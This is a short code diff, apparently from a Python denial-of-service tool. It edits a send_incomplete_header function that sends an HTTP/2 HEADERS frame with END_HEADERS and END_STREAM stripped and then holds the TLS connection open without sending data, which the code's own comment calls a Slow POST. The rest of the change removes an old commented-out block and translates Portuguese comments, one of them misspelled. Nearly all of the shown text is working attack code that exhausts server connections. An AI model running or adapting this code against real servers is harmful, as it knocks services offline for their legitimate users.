@@ -57,22 +57,14 @@ def send_incomplete_header(tls_sock, target, path):
             (':scheme', 'https'),
             (':path', path)
         ]
-        """
-        # Send HEADERS frame with END_HEADERS set and END_STREAM unset
-        stream_id = conn.get_next_available_stream_id()
-        conn.send_headers(stream_id, headers, end_stream=True)
-        tls_sock.sendall(conn.data_to_send())
 
-        #print(f"POST headers sent. Server is waiting for data...")
-        """
-
-        # Criando o frame HEADERS
+        # Criating a frame HEADERS
         stream_id = conn.get_next_available_stream_id()
+        
         headers_frame = HeadersFrame(stream_id)
         headers_frame.flags = set()  # Remove todas as flags, desativando END_HEADERS e END_STREAM
         headers_frame.data = b''.join([f'{k}: {v}\r\n'.encode('utf-8') for k, v in headers])
-
-        # Envia o frame HEADERS para o servidor
+        
         tls_sock.sendall(headers_frame.serialize())
 
         # Loop to keep the connection open without sending data (simulating a Slow POST)
